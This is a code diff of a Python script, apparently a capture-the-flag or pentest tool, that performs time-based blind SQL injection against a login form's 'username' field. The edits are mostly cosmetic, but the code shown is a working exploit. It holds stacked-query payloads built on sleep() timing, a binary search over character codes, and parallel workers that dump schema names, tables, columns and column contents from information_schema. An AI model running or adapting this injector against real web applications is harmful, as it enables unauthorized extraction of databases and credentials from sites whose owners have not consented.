@@ -1,17 +1,19 @@
-#AUTHOR: jahman 
+#AUTHOR: jahman
 #EDITED BY grisun0
 
 import requests
+
 requests.packages.urllib3.disable_warnings()
-import re, sys, time
 import argparse
-import concurrent.futures
+import sys
+import time
 from concurrent.futures import ProcessPoolExecutor, as_completed
+
 
 def send_payload(payload, url, s, sql_time):
     payload = f"FUZZ';{payload}#"
 
-    
+
     post_data = {'username': payload}
     headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie": ""}
     start_time = time.time()
@@ -26,7 +28,7 @@ def send_payload(payload, url, s, sql_time):
             return False
 
 def sqli_dichotomie(payload_brute, offset, url, s, sql_time):
-    payload_brute = payload_brute.replace("ZION_OFFSET", str(offset))  
+    payload_brute = payload_brute.replace("ZION_OFFSET", str(offset))
     start = 32
     end = 127
     guess = -1
@@ -48,23 +50,23 @@ def sqli_dichotomie(payload_brute, offset, url, s, sql_time):
 
 def sqli_thread(url, db, table, col, sql_time, threads):
     CRACKED = list()
-    s = requests.Session()  
+    s = requests.Session()
 
     offset = 1
     stop = 1
     while stop != -1:
         CRACKED.extend("\x00" * threads)
         with ProcessPoolExecutor(max_workers=threads) as e:
-            
+
             payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT(schema_name), ZION_OFFSET, 1)) FROM information_schema.schemata)"
-            
-            
+
+
             payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT(table_name), ZION_OFFSET, 1)) FROM information_schema.TABLES where table_schema like '{db}%')"
 
-            
+
             payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT(column_name), ZION_OFFSET, 1)) from information_schema.columns WHERE table_name = '{table}' AND table_schema like '{db}%')"
 
-            
+
             payload = f"select sleep({sql_time}) FROM information_schema.TABLES where (select ord(SUBSTR(GROUP_CONCAT({col}), ZION_OFFSET, 1)) from {table})"
 
             resultat = {e.submit(sqli_dichotomie, payload, inject, url, s, sql_time): inject for inject in range(offset, offset + threads)}
@@ -77,7 +79,7 @@ def sqli_thread(url, db, table, col, sql_time, threads):
                 res_char = chr(future.result()[0])
                 CRACKED[res_offset] = res_char
                 print(''.join(CRACKED), end="\r\n")
-            except Exception as exc:
+            except Exception:
                 continue
 
         offset = offset + threads
